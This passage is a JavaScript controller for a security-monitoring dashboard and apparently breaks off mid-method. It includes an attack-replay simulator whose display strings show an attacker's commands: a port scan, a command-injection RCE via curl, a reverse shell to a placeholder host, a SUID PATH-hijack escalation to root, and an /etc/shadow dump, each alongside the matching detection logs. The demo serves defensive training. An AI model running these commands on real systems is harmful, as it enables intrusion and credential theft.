/**
 * NO ENTRY - Watch SIEM & Threat Hunting Screen Controller (Screen 7)
 * Drives the real-time alert stream with state filters, slide-in inspection drawer,
 * automated IP block and host isolation, live-sorting Top Techniques bars,
 * threat hunt query evaluator with mini-histogram, and the live EPS waveform.
 */

import { initAppShell } from '../core/appShell.js';
import { wsClient } from '../core/ws.js';
import { api } from '../core/api.js';
import { sound } from '../core/sound.js';
import { toast } from '../core/ui.js';

class WatchController {
  constructor() {
    this.currentFilter = 'ALL';
    this.eventsCache = new Map();
    this.activeDrawerEventId = null;
    this.techniquesData = [
      { id: 'T1110', name: 'T1110 brute force', pct: 82, color: 'var(--color-red)' },
      { id: 'T1190', name: 'T1190 exploit public app', pct: 61, color: 'var(--color-cyan)' },
      { id: 'T1558', name: 'T1558 kerberoast', pct: 44, color: '#FFB800' },
      { id: 'T1071', name: 'T1071 dns tunnel', pct: 27, color: 'var(--color-green)' }
    ];
    this.epsHistory = new Array(40).fill(1.2);
    this.totalEventsCount = 1428;
  }

  async init() {
    initAppShell('watch');

    this.initWaveform();
    this.initFilterChips();
    this.initDrawer();
    this.initHuntPanel();
    this.renderTechniques();
    this.initLiveAttackDemo();

    this.bindWebSocket();
    await this.loadInitialData();
  }

  initWaveform() {
    const canvas = document.getElementById('epsWaveformCanvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');

    const draw = () => {
      requestAnimationFrame(draw);
      const w = canvas.width = canvas.clientWidth || 400;
      const h = canvas.height = canvas.clientHeight || 38;

      ctx.clearRect(0, 0, w, h);

      // Grid background line
      ctx.strokeStyle = 'rgba(26, 31, 41, 0.6)';
      ctx.lineWidth = 1;
      ctx.beginPath();
      ctx.moveTo(0, h / 2);
      ctx.lineTo(w, h / 2);
      ctx.stroke();

      // Waveform line
      const data = this.epsHistory;
      const step = w / (data.length - 1);
      const maxVal = Math.max(...data, 4.0);

      // Gradient Fill
      const grad = ctx.createLinearGradient(0, 0, 0, h);
      grad.addColorStop(0, 'rgba(0, 229, 255, 0.3)');
      grad.addColorStop(1, 'rgba(0, 229, 255, 0.0)');

      ctx.beginPath();
      ctx.moveTo(0, h);
      for (let i = 0; i < data.length; i++) {
        const x = i * step;
        const y = h - (data[i] / maxVal) * (h - 6) - 3;
        ctx.lineTo(x, y);
      }
      ctx.lineTo(w, h);
      ctx.closePath();
      ctx.fillStyle = grad;
      ctx.fill();

      // Cyan Trace
      ctx.beginPath();
      for (let i = 0; i < data.length; i++) {
        const x = i * step;
        const y = h - (data[i] / maxVal) * (h - 6) - 3;
        if (i === 0) ctx.moveTo(x, y);
        else ctx.lineTo(x, y);
      }
      ctx.strokeStyle = '#00E5FF';
      ctx.lineWidth = 1.5;
      ctx.shadowColor = '#00E5FF';
      ctx.shadowBlur = 4;
      ctx.stroke();
      ctx.shadowBlur = 0;
    };
    draw();

    // Natural decay
    setInterval(() => {
      const last = this.epsHistory[this.epsHistory.length - 1];
      const target = 1.0 + Math.random() * 0.4;
      const next = last * 0.85 + target * 0.15;
      this.pushEps(next);
    }, 800);
  }

  pushEps(val) {
    this.epsHistory.push(val);
    if (this.epsHistory.length > 40) this.epsHistory.shift();
    const rateEl = document.getElementById('epsRateVal');
    if (rateEl) rateEl.innerText = val.toFixed(1);
  }

  initFilterChips() {
    const chips = document.querySelectorAll('.filter-chip');
    chips.forEach(chip => {
      chip.addEventListener('click', () => {
        chips.forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        this.currentFilter = chip.dataset.filter;
        sound.keyClick();
        this.filterTableRows();
      });
    });
  }

  filterTableRows() {
    const rows = document.querySelectorAll('#watchAlertsTbody tr');
    rows.forEach(tr => {
      const state = tr.dataset.state || '';
      if (this.currentFilter === 'ALL' || state.toUpperCase() === this.currentFilter) {
        tr.style.display = '';
      } else {
        tr.style.display = 'none';
      }
    });
  }

  async loadInitialData() {
    try {
      const events = await api.get('/events?limit=40');
      if (Array.isArray(events)) {
        this.allStreamEvents = events;
        const tbody = document.getElementById('watchAlertsTbody');
        if (tbody) tbody.innerHTML = '';
        const seen = new Set();
        events.forEach(evt => {
          if (!evt || (evt.id && seen.has(evt.id))) return;
          if (evt.id) seen.add(evt.id);
          this.eventsCache.set(evt.id, evt);
          this.appendAlertRow(evt, false);
        });
        this.updateTechniquesFromEvents(events);
      }
    } catch (err) {
      console.warn('Initial events load note:', err);
    }
  }

  updateTechniquesFromEvents(events) {
    if (!events || !events.length) return;
    const counts = {};
    events.forEach(e => {
      const tid = e.technique_id || 'OTHER';
      counts[tid] = (counts[tid] || 0) + 1;
    });
    const total = events.length;
    const colors = {
      'T1110': 'var(--color-red)',
      'T1190': 'var(--color-cyan)',
      'T1558': '#FFB800',
      'T1071': 'var(--color-green)',
      'T1486': 'var(--color-red)',
      'T1021': 'var(--color-cyan)',
      'T1059': '#FFB800',
      'T1548': 'var(--color-green)'
    };
    const names = {
      'T1110': 'T1110 brute force',
      'T1190': 'T1190 exploit public app',
      'T1558': 'T1558 kerberoast',
      'T1071': 'T1071 dns tunnel',
      'T1486': 'T1486 data encrypted',
      'T1021': 'T1021 remote services',
      'T1059': 'T1059 command interpreter',
      'T1548': 'T1548 abuse elevation'
    };

    const sortedTech = Object.entries(counts)
      .sort((a, b) => b[1] - a[1])
      .slice(0, 5);

    this.techniquesData = sortedTech.map(([tid, count]) => {
      const pct = Math.round((count / total) * 100);
      return {
        id: tid,
        name: names[tid] || `${tid} technique`,
        pct: Math.max(12, Math.min(95, pct)),
        color: colors[tid] || 'var(--color-cyan)'
      };
    });
    this.renderTechniques();
  }

  bindWebSocket() {
    wsClient.on('message', (msg) => {
      if (!msg) return;

      if (msg.type === 'event') {
        const evt = msg.data;
        if (!evt) return;
        if (evt.id && this.eventsCache.has(evt.id)) return;

        this.eventsCache.set(evt.id, evt);
        this.onNewEvent(evt);
      } else if (msg.type === 'metrics') {
        if (msg.data && msg.data.events_per_second) {
          this.pushEps(msg.data.events_per_second);
        }
      } else if (msg.type === 'snapshot') {
        const eps = msg.data?.events_per_second ?? msg.data?.metrics?.events_per_second;
        if (eps != null) {
          this.pushEps(eps);
        }
      }
    });
  }

  onNewEvent(evt) {
    // 1. Spikes waveform
    const spike = evt.severity === 'CRITICAL' ? 3.8 : (evt.severity === 'HIGH' ? 2.8 : 1.8);
    this.pushEps(spike);

    // 2. Increment total processed
    this.totalEventsCount++;
    const totalEl = document.getElementById('totalEventsVal');
    if (totalEl) totalEl.innerText = this.totalEventsCount.toLocaleString();

    // 3. Play blip
    sound.blip(evt.state === 'BLOCKED' ? 1050 : 650, 0.06);

    // 4. Slide in row
    this.appendAlertRow(evt, true);

    // 5. Nudge technique percentages
    this.shiftTechniques(evt.technique_id);
  }

  appendAlertRow(evt, isNew = false) {
    const tbody = document.getElementById('watchAlertsTbody');
    if (!tbody) return;

    const tr = document.createElement('tr');
    tr.className = 'stream-row';
    tr.dataset.eventId = evt.id;
    const state = (evt.state || 'DETECTED').toUpperCase();
    tr.dataset.state = state;

    let tagClass = 'tag--detected';
    if (state === 'BLOCKED') tagClass = 'tag--blocked';
    else if (state === 'ALERT') tagClass = 'tag--alert';
    else if (state === 'ISOLATED') tagClass = 'tag--isolated';

    tr.innerHTML = `
      <td style="color:var(--color-muted); font-size:11px;">${evt.time || 'NOW'}</td>
      <td><span class="badge" style="font-size:10px;">${evt.technique_id}</span></td>
      <td style="color:var(--color-text); font-size:12px; font-weight:500;">${evt.event}</td>
      <td style="font-family:var(--font-mono); font-size:11px; color:var(--color-cyan);">${evt.source_ip || '-'}</td>
      <td><span class="tag ${tagClass}">${state}</span></td>
    `;

    tr.addEventListener('click', () => this.openDrawer(evt.id));

    if (this.currentFilter !== 'ALL' && state !== this.currentFilter) {
      tr.style.display = 'none';
    }

    if (isNew) {
      tr.style.background = 'rgba(0, 229, 255, 0.28)';
      tr.style.transform = 'translateY(-10px)';
      tr.style.opacity = '0';
      tr.style.transition = 'all 0.3s ease';

      tbody.insertBefore(tr, tbody.firstChild);

      void tr.offsetWidth;
      tr.style.transform = 'translateY(0)';
      tr.style.opacity = '1';

      setTimeout(() => {
        tr.style.background = state === 'BLOCKED' ? 'rgba(0, 255, 106, 0.15)' : 'transparent';
        setTimeout(() => { tr.style.background = 'transparent'; }, 600);
      }, 350);

      while (tbody.children.length > 40) {
        tbody.removeChild(tbody.lastChild);
      }
    } else {
      tbody.appendChild(tr);
    }
  }

  renderTechniques() {
    const container = document.getElementById('techBarsContainer');
    if (!container) return;

    // Sort descending by percentage
    this.techniquesData.sort((a, b) => b.pct - a.pct);

    container.innerHTML = '';
    this.techniquesData.forEach(t => {
      const row = document.createElement('div');
      row.className = 'tech-bar-row';
      row.id = `techRow_${t.id}`;
      row.innerHTML = `
        <div class="tech-bar-label">
          <span>${t.name}</span>
          <span id="techVal_${t.id}" style="color:${t.color}; font-weight:700;">${t.pct}%</span>
        </div>
        <div class="tech-bar-track">
          <div id="techFill_${t.id}" class="tech-bar-fill" style="width:${t.pct}%; background:${t.color}; box-shadow:0 0 8px ${t.color};"></div>
        </div>
      `;
      container.appendChild(row);
    });
  }

  shiftTechniques(triggeredTechId) {
    let reRender = false;
    this.techniquesData.forEach(t => {
      if (t.id === triggeredTechId) {
        t.pct = Math.min(98, t.pct + 2);
        reRender = true;
      } else {
        if (Math.random() < 0.2) {
          t.pct = Math.max(15, t.pct - 1);
        }
      }
    });

    if (reRender) {
      this.renderTechniques();
    }
  }

  initDrawer() {
    const drawer = document.getElementById('slideDrawer');
    const closeBtn = document.getElementById('closeDrawerBtn');
    if (closeBtn && drawer) {
      closeBtn.addEventListener('click', () => {
        drawer.classList.remove('open');
        sound.keyClick();
      });
    }

    window.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && drawer && drawer.classList.contains('open')) {
        drawer.classList.remove('open');
      }
    });

    // Wire Block IP & Isolate Host buttons
    const blockBtn = document.getElementById('drawerBlockIpBtn');
    const isolateBtn = document.getElementById('drawerIsolateHostBtn');

    if (blockBtn) {
      blockBtn.addEventListener('click', async () => {
        const evt = this.eventsCache.get(this.activeDrawerEventId);
        if (evt && evt.source_ip) {
          try {
            sound.threatAlert();
            await api.post('/block-ip', { ip: evt.source_ip, reason: 'Manual Watch drawer ban' });
            blockBtn.innerText = `BLOCKED: ${evt.source_ip}`;
            blockBtn.disabled = true;
            toast(`Perimeter firewall rule deployed: ${evt.source_ip} blocked`, 'danger');
          } catch (err) {
            toast(`Failed to block IP ${evt.source_ip}: ${err.message}`, 'danger');
          }
        }
      });
    }

    if (isolateBtn) {
      isolateBtn.addEventListener('click', async () => {
        const evt = this.eventsCache.get(this.activeDrawerEventId);
        if (evt && evt.target_host) {
          try {
            sound.threatAlert();
            await api.post(`/hosts/${evt.target_host}/isolate`);
            isolateBtn.innerText = `ISOLATED: ${evt.target_host}`;
            isolateBtn.disabled = true;
            toast(`Quarantine active: Host ${evt.target_host} isolated`, 'danger');
          } catch (err) {
            toast(`Failed to isolate ${evt.target_host}: ${err.message}`, 'danger');
          }
        }
      });
    }
  }

  async openDrawer(eventId) {
    const drawer = document.getElementById('slideDrawer');
    if (!drawer) return;

    this.activeDrawerEventId = eventId;
    sound.panelOpen();

    drawer.classList.add('open');

    // Default placeholder
    document.getElementById('drawerTitle').innerText = `EVENT // ${eventId}`;
    document.getElementById('drawerMitreTitle').innerText = 'Loading MITRE technique...';
    document.getElementById('drawerMitreDesc').innerText = 'Querying cyber catalog...';
    document.getElementById('drawerIntelScore').innerText = '...';
    document.getElementById('drawerIntelCountry').innerText = '';
    document.getElementById('drawerIntelIsp').innerText = '';
    document.getElementById('drawerRawJson').innerText = '// Fetching raw telemetry...';

    const blockBtn = document.getElementById('drawerBlockIpBtn');
    const isolateBtn = document.getElementById('drawerIsolateHostBtn');
    if (blockBtn) { blockBtn.disabled = false; blockBtn.innerText = 'BLOCK IP'; }
    if (isolateBtn) { isolateBtn.disabled = false; isolateBtn.innerText = 'ISOLATE HOST'; }

    try {
      const data = await api.get(`/events/${eventId}`);
      if (data) {
        const evt = data.event || {};
        const mitre = data.mitre_technique || {};
        const intel = data.enrichment || {};

        document.getElementById('drawerMitreTitle').innerText = `${mitre.id || evt.technique_id} : ${mitre.name || evt.technique_name}`;
        document.getElementById('drawerMitreDesc').innerText = mitre.description || evt.event;

        document.getElementById('drawerIntelScore').innerText = `${intel.abuse_confidence_score ?? 88}% THREAT`;
        document.getElementById('drawerIntelCountry').innerText = `${intel.country_name || 'Global'} (${intel.country_code || 'US'})`;
        document.getElementById('drawerIntelIsp').innerText = `ISP: ${intel.isp || 'Host Provider'} \u2022 Usage: ${intel.usage_type || 'Datacenter'}`;

        document.getElementById('drawerRawJson').innerText = JSON.stringify(data.raw_log || evt, null, 2);
      }
    } catch (err) {
      console.warn('Event detail query fallback:', err);
      const cached = this.eventsCache.get(eventId);
      if (cached) {
        document.getElementById('drawerMitreTitle').innerText = `${cached.technique_id} : ${cached.technique_name}`;
        document.getElementById('drawerMitreDesc').innerText = cached.event;
        document.getElementById('drawerIntelScore').innerText = 'MALICIOUS DETECTED';
        document.getElementById('drawerIntelCountry').innerText = cached.source_ip;
        document.getElementById('drawerRawJson').innerText = JSON.stringify(cached, null, 2);
      } else {
        toast(`Could not load details for event ${eventId}: ${err.message}`, 'warning');
      }
    }
  }

  initHuntPanel() {
    const input = document.getElementById('huntQueryInput');
    const runBtn = document.getElementById('runHuntBtn');
    const presetBtns = document.querySelectorAll('.preset-btn');
    const clearBtn = document.getElementById('clearHuntBtn');

    if (clearBtn) {
      clearBtn.addEventListener('click', () => {
        try { sound.keyClick(); } catch (_) {}
        this.resetHuntFilter();
      });
    }

    presetBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        if (input) input.value = btn.dataset.query;
        try { sound.keyClick(); } catch (_) {}
        this.executeHunt(btn.dataset.query);
      });
    });

    if (runBtn && input) {
      runBtn.addEventListener('click', () => {
        try { sound.keyClick(); } catch (_) {}
        this.executeHunt(input.value);
      });
    }

    if (input) {
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          try { sound.keyClick(); } catch (_) {}
          this.executeHunt(input.value);
        }
      });
    }
  }

  resetHuntFilter() {
    const banner = document.getElementById('huntActiveBanner');
    if (banner) banner.style.display = 'none';

    const resultBox = document.getElementById('huntResultBox');
    if (resultBox) resultBox.classList.remove('active');

    const tbody = document.getElementById('watchAlertsTbody');
    if (tbody && this.allStreamEvents) {
      tbody.innerHTML = '';
      this.allStreamEvents.forEach(evt => this.appendAlertRow(evt, false));
      this.updateTechniquesFromEvents(this.allStreamEvents);
    }
    toast('Hunt filter cleared: live telemetry stream restored', 'info');
  }

  async executeHunt(queryStr) {
    const resultBox = document.getElementById('huntResultBox');
    const hitsText = document.getElementById('huntHitsText');
    const hypText = document.getElementById('huntHypothesisText');
    const runBtn = document.getElementById('runHuntBtn');
    const banner = document.getElementById('huntActiveBanner');
    const bannerQuery = document.getElementById('huntBannerQuery');
    const bannerHits = document.getElementById('huntBannerHits');
    const tbody = document.getElementById('watchAlertsTbody');

    const cleanQuery = (queryStr || '').trim();
    if (!cleanQuery) {
      toast('Please enter a query or select a preset to hunt telemetry', 'info');
      return;
    }

    const originalLabel = runBtn ? runBtn.innerText : 'RUN HUNT';
    if (runBtn) {
      runBtn.disabled = true;
      runBtn.innerText = 'HUNTING...';
    }

    try {
      const res = await api.post('/hunt', { query: cleanQuery });

      // Update banner
      if (banner && bannerQuery && bannerHits) {
        bannerQuery.innerText = cleanQuery;
        bannerHits.innerText = res.hits || 0;
        banner.style.display = 'flex';
      }

      // Populate Alert Stream with matched events
      if (tbody) {
        tbody.innerHTML = '';
        if (res && Array.isArray(res.matched_events) && res.matched_events.length > 0) {
          res.matched_events.forEach(evt => {
            if (evt && evt.id) this.eventsCache.set(evt.id, evt);
            this.appendAlertRow(evt, false);
          });
          this.updateTechniquesFromEvents(res.matched_events);
        } else {
          tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:var(--color-muted); padding:24px; font-family:var(--font-mono); font-size:12px;">NO TELEMETRY MATCHED QUERY "${cleanQuery}" // TRY PRESET OR CLEAR FILTER</td></tr>`;
        }
      }

      if (res && resultBox) {
        resultBox.classList.add('active');
        if (hitsText) hitsText.innerText = `HITS: ${res.hits} in ${res.timeframe}`;
        if (hypText) hypText.innerText = `Hypothesis: ${res.hypothesis}`;

        this.renderMiniHistogram(res.histogram || []);
        resultBox.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
      }
    } catch (err) {
      console.error('Hunt execution error:', err);
      toast(`Hunt evaluation failed: ${err.message}`, 'danger');
      if (resultBox) {
        resultBox.classList.add('active');
        if (hitsText) hitsText.innerText = 'HITS: 0 (Error)';
        if (hypText) hypText.innerText = `Query Error: ${err.message}`;
      }
    } finally {
      if (runBtn) {
        runBtn.disabled = false;
        runBtn.innerText = originalLabel || 'RUN HUNT';
      }
    }
  }

  renderMiniHistogram(histogram) {
    const canvas = document.getElementById('histogramCanvas');
    if (!canvas || !histogram.length) return;

    const ctx = canvas.getContext('2d');
    const w = canvas.width = canvas.clientWidth || 140;
    const h = canvas.height = canvas.clientHeight || 32;

    ctx.clearRect(0, 0, w, h);

    const counts = histogram.map(b => b.count);
    const max = Math.max(...counts, 10);
    const barWidth = (w / histogram.length) - 2;

    histogram.forEach((bucket, i) => {
      const barHeight = (bucket.count / max) * (h - 4);
      const x = i * (barWidth + 2);
      const y = h - barHeight - 2;

      ctx.fillStyle = '#00E5FF';
      ctx.fillRect(x, y, barWidth, barHeight);
    });
  }

  initLiveAttackDemo() {
    const btnLaunch = document.getElementById('btnLaunchLiveAttack');
    const modal = document.getElementById('liveAttackModal');
    const btnClose = document.getElementById('btnCloseLiveAttack');

    this.liveDemo = new LiveAttackSimulator();

    if (btnLaunch) {
      btnLaunch.addEventListener('click', () => {
        sound.bootHum();
        if (modal) modal.style.display = 'flex';
        this.liveDemo.start();
      });
    }

    if (btnClose && modal) {
      btnClose.addEventListener('click', () => {
        sound.keyClick();
        this.liveDemo.pause();
        modal.style.display = 'none';
      });
    }

    // Auto-launch if URL has ?demo=1
    const params = new URLSearchParams(window.location.search);
    if (params.get('demo') === '1') {
      setTimeout(() => {
        if (modal) modal.style.display = 'flex';
        this.liveDemo.start();
      }, 500);
    }
  }
}

// ---------------------------------------------------------------------------
// 60-SECOND FULL-SPECTRUM LIVE CYBER ATTACK REPLAY SIMULATOR
// ---------------------------------------------------------------------------

class LiveAttackSimulator {
  constructor() {
    this.totalDuration = 60.0;
    this.currentTime = 0.0;
    this.speed = 1;
    this.isPlaying = false;
    this.timerId = null;
    this.currentStageIdx = 0;

    this.stages = [
      {
        id: 'stage-1',
        title: 'RECONNAISSANCE',
        techId: 'T1595.001',
        desc: 'Active network port scan & service fingerprinting against perimeter interface 10.10.14.90.',
        statusText: 'INBOUND PROBES DETECTED',
        startTime: 0.0,
        endTime: 7.5,
        redOutput: `root@kali:~# nmap -sS -T4 -p 22,80,443,3389,8080 10.10.14.90
Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-16 00:00:01 UTC
Nmap scan report for 10.10.14.90
Host is up (0.00042s latency).
PORT     STATE SERVICE VERSION
22/tcp   OPEN  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp   OPEN  http    Apache httpd 2.4.52
443/tcp  OPEN  https   Apache httpd 2.4.52
3389/tcp CLOSE ms-wbt-server
8080/tcp OPEN  http-proxy NO_ENTRY API Gateway v1.4
Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds
root@kali:~# `,
        blueOutput: `[10:00:02] [FIREWALL-INBOUND] SRC=198.51.100.42 DST=10.10.14.90 PROTO=TCP DPT=22,80,443,3389,8080 FLAGS=SYN
[10:00:03] [SURICATA-ALERT] ET SCAN Potential Inbound Port Scan - 5 SYNs in 1.2s from 198.51.100.42
[10:00:04] [ZEEK-CONN] duration=0.0012 orig_h=198.51.100.42 resp_h=10.10.14.90 history=ShAdDr
[10:00:05] [SOC-EVENT] Sensor 01 flagged external recon sweep. Severity: LOW.`
      },
      {
        id: 'stage-2',
        title: 'INITIAL FOOTHOLD',
        techId: 'T1190',
        desc: 'Exploiting public API debug endpoint to spawn interactive reverse shell session.',
        statusText: 'EXPLOIT TRIGGERED // RCE ESTABLISHED',
        startTime: 7.5,
        endTime: 15.0,
        redOutput: `root@kali:~# curl -X POST http://10.10.14.90:8080/api/v1/debug \\
  -d "cmd=python3 -c \\"import pty; pty.spawn('/bin/bash')\\""
[+] Exploit vector confirmed on /api/v1/debug [RCE CWE-94]
[+] Catching reverse TCP stream on 198.51.100.42:4444...
www-data@corp-web01:/var/www/html$ whoami
www-data
www-data@corp-web01:/var/www/html$ pwd
/var/www/html`,
        blueOutput: `[10:00:09] [NGINX-ACCESS] 198.51.100.42 POST /api/v1/debug HTTP/1.1 STATUS=200 BYTES=412
[10:00:10] [SYSMON-EVENT-1] Image=/usr/bin/python3 CommandLine="python3 -c import pty..." ParentImage=/usr/sbin/apache2 User=www-data
[10:00:11] [EDR-ANOMALY] Web daemon spawned interactive shell /bin/bash (Anomalous Child Process)
[10:00:12] [CORRELATION-ALERT] Severity: HIGH | Rule: Web_Shell_Spawn_Suspicious_Interpreter
[10:00:13] [SOC-DISPATCH] Incident INC-2026-LIVE created and queued.`
      },
      {
        id: 'stage-3',
        title: 'DEFENSE EVASION & LOCAL DISCOVERY',
        techId: 'T1082 / T1059',
        desc: 'Attacker enumerates system permissions, OS release, and scans for misconfigured SUID binaries.',
        statusText: 'LOCAL HOST ENUMERATION ACTIVE',
        startTime: 15.0,
        endTime: 22.5,
        redOutput: `www-data@corp-web01:/var/www/html$ uname -a && id
Linux corp-web01 6.1.0-custom #1 SMP PREEMPT x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@corp-web01:/var/www/html$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/su
/usr/bin/passwd
/usr/local/bin/backup_util  <-- [!] SUID Root Bit Set!
www-data@corp-web01:/var/www/html$ strings /usr/local/bin/backup_util | grep -E "system|exec"
system("tar -czf /backups/site.tar.gz /var/www/html");`,
        blueOutput: `[10:00:17] [AUDITD-EXEC] comm=find uid=33 auid=4294967295 exe=/usr/bin/find args="find / -perm -4000..."
[10:00:19] [EDR-BEHAVIOR] High-volume file attribute enumeration detected from user=www-data
[10:00:20] [ZEEK-STREAM] Continuous interactive payload streaming on TCP port 4444
[10:00:21] [SURICATA-FLOW] Outbound interactive C2 traffic persistent on TCP:4444 to 198.51.100.42`
      },
      {
        id: 'stage-4',
        title: 'PRIVILEGE ESCALATION',
        techId: 'T1548.001 / T1003',
        desc: 'SUID PATH hijacking leveraged to acquire root execution; /etc/shadow dumped.',
        statusText: 'ROOT PRIVILEGE ESCALATION CONFIRMED',
        startTime: 22.5,
        endTime: 30.0,
        redOutput: `www-data@corp-web01:/var/www/html$ echo -e '#!/bin/bash\\n/bin/bash -p' > /tmp/tar
www-data@corp-web01:/var/www/html$ chmod +x /tmp/tar
www-data@corp-web01:/var/www/html$ export PATH=/tmp:$PATH
www-data@corp-web01:/var/www/html$ /usr/local/bin/backup_util
root@corp-web01:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@corp-web01:/var/www/html# cat /etc/shadow | grep -E "root|admin"
root:$6$v192x...:19240:0:99999:7:::
svc_admin:$6$rounds=5000$q88xZ...:19240:0:99999:7:::
[+] High-value credential hashes harvested!`,
        blueOutput: `[10:00:24] [SYSMON-EVENT-1] Image=/tmp/tar CommandLine="/bin/bash -p" ParentImage=/usr/local/bin/backup_util IntegrityLevel=SYSTEM User=root
[10:00:26] [EDR-ALERT] CRITICAL: PATH hijacking detected on SUID binary /usr/local/bin/backup_util
[10:00:27] [AUDITD-SENSITIVE] Process /bin/cat (PID=4912) accessed /etc/shadow with EUID=0
[10:00:29] [SIEM-SEVERITY-ESCALATION] Host corp-web01 elevated to SEV-1 CRITICAL.`
      },
      {
        id: 'stage-5',
        title: 'TELEMETRY INGESTION',
        techId: 'T1046 / T1071',
        desc: 'Attacker probes internal subnet; SOC correlation engine aggregates 12 correlated telemetry items.',
        statusText: 'MULTI-SENSOR TELEMETRY CORRELATING',
        startTime: 30.0,
        endTime: 37.5,
        redOutput: `root@corp-web01:/var/www/html# ping -c 1 10.10.14.200
64 bytes from 10.10.14.200: icmp_seq=1 ttl=64 time=0.312 ms
root@corp-web01:/var/www/html# nc -zv 10.10.14.200 445 88 389
Connection to 10.10.14.200 445 port [tcp/microsoft-ds] succeeded!
Connection to 10.10.14.200 88 port [tcp/kerberos] succeeded!
[!] Preparing Kerberoast SPN ticket extraction...`,
        blueOutput: `[10:00:32] [SIGMA-ENGINE] Ingesting telemetry pipeline: 12 events in 1.4s window
[10:00:33] [CORRELATION-TREE] Linking Incident INC-2026-LIVE:
    - Stage 1: SYN scan from 198.51.100.42
    - Stage 2: Web RCE on :8080
    - Stage 3: SUID PATH hijack to Root
    - Stage 4: Internal SMB / Kerberos probing to 10.10.14.200
[10:00:35] [TELEMETRY-STREAM] Ingest rate spiked: 42.4 EPS`
      },
      {
        id: 'stage-6',
        title: 'AUTOMATED SIEM DETECTION',
        techId: 'T1548 / T1021',
        desc: 'Sigma detection rules evaluate process creation & lateral probing, firing high-priority alerts.',
        statusText: 'SIGMA DETECTION RULES TRIGGERED',
        startTime: 37.5,
        endTime: 45.0,
        redOutput: `root@corp-web01:/var/www/html# python3 -c "import socket; s=socket.socket(); s.connect(('10.10.14.200', 445))"
[*] Lateral propagation initiated to internal domain controller...
[*] Sending crafted Kerberos ticket request...`,
        blueOutput: `[10:00:39] [🔥 SIGMA MATCH] Rule: "proc_creation_lnx_suid_privesc_elevation"
    Tags: attack.privilege_escalation, attack.t1548.001
    Threat Score: 98/100 | Severity: CRITICAL
[10:00:41] [🔥 SIGMA MATCH] Rule: "net_lateral_movement_dmz_to_internal_dc"
    Target: 10.10.14.200:445 from Unauthorised DMZ host 10.10.14.90
[10:00:43] [SIEM-DISPATCH] Escalated to Tier-2 SOC Dispatch Queue`
      },
      {
        id: 'stage-7',
        title: 'SOC ANALYST TRIAGE',
        techId: 'SOC Workflow / IR',
        desc: 'SOC analyst op-0x7f3a verifies process ancestry, confirms active breach, and triggers containment playbook.',
        statusText: 'HUMAN INVESTIGATION & VERIFICATION',
        startTime: 45.0,
        endTime: 52.5,
        redOutput: `root@corp-web01:/var/www/html# ps aux | grep -E "nc|bash|python"
www-data  4812  0.1  0.2  bash -i
root      4991  0.0  0.1  /bin/bash -p
root@corp-web01:/var/www/html# cat /var/log/audit/audit.log
[!] Audit daemon actively tracking shell session!`,
        blueOutput: `[10:00:46] [SOC-INVESTIGATOR] Analyst op-0x7f3a assigned to INC-2026-LIVE
[10:00:47] [SOC-QUERY] Query: host.ip: 10.10.14.90 AND process.euid: 0
[10:00:49] [SOC-TRIAGE] Verdict: TRUE POSITIVE - ACTIVE ADVERSARY COMPROMISE
[10:00:50] [REFLEX-DISPATCH] Initiating automated containment playbook PB-ZERO-TRUST-01
[10:00:51] [PLAYBOOK] Action 1: Firewall ACL Update | Action 2: SDN Port Quarantine`
      },
      {
        id: 'stage-8',
        title: 'CONTAINMENT & RECOVERY',
        techId: 'Containment / Eradication',
        desc: 'Zero-trust network isolation blocks attacker IP, quarantines compromised host, and generates PIR.',
        statusText: 'BREACH CONTAINED // INCIDENT RESOLVED',
        startTime: 52.5,
        endTime: 60.0,
        redOutput: `root@corp-web01:/var/www/html# whoami
Connection reset by peer.
root@kali:~# curl -I http://10.10.14.90:8080/
curl: (7) Failed to connect to 10.10.14.90 port 8080: Connection refused / Host Isolated
[-] [OPERATION HALTED] Target host network interface isolated by Defender.`,
        blueOutput: `[10:00:54] [REFLEX-ACTION] Added DROP rule for SRC=198.51.100.42 on Perimeter Firewall (iptables)
[10:00:56] [CONTAINMENT] Host 10.10.14.90 isolated via SDN Controller (VLAN 999 Quarantine)
[10:00:57] [REMEDIATION] Revoked credential svc_admin; removed SUID bit from /usr/local/bin/backup_util
[10:00:59] [INCIDENT-RESOLVED] INC-2026-LIVE Closed in 58.4s. 0 Data Exfiltrated.
========================================================================
  POST-INCIDENT REPORT GENERATED // MTTD: 3.2s // MTTR: 8.4s
========================================================================`
      }
    ];

    this.bindControls();
  }

  bindControls() {
    const btnPlayPause = document.getElementById('btnDemoPlayPause');
    const btnSpeed = document.getElementById('btnDemoSpeed');
    const btnReplay = document.getElementById('btnDemoReplay');
    const track = document.getElementById('demoProgressTrack');
    const chips = document.querySelectorAll('.stage-chip');

    if (btnPlayPause) {
      btnPlayPause.addEventListener('click', () => {
        sound.keyClick();
        this.togglePlayPause();
      });
    }

    if (btnSpeed) {
      btnSpeed.addEventListener('click', () => {
        sound.keyClick();
        this.toggleSpeed();
      });
    }

    if (btnReplay) {
      btnReplay.addEventListener('click', () => {
        sound.bootHum();
        this.replay();
      });
    }

    if (track) {
      track.addEventListener('click', (e) => {
        const rect = track.getBoundingClientRect();
        const clickRatio = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
        this.currentTime = clickRatio * this.totalDuration;
        this.updateStageFromTime();
        this.renderCurrentState();
      });
    }

    chips.forEach(chip => {
      chip.addEventListener('click', () => {
        sound.keyClick();
        const stageIdx = parseInt(chip.dataset.stage, 10);
        if (!isNaN(stageIdx) && stageIdx >= 0 && stageIdx < this.stages.length) {
          this.jumpToStage(stageIdx);
        }
      });
    });
  }

  start() {
    this.isPlaying = true;
    const btnPlayPause = document.getElementById('btnDemoPlayPause');
    if (btnPlayPause) btnPlayPause.textContent = '❚❚ PAUSE';

    if (this.timerId) clearInterval(this.timerId);
    this.timerId = setInterval(() => this.tick(), 250);
    this.renderCurrentState();
  }

  pause() {
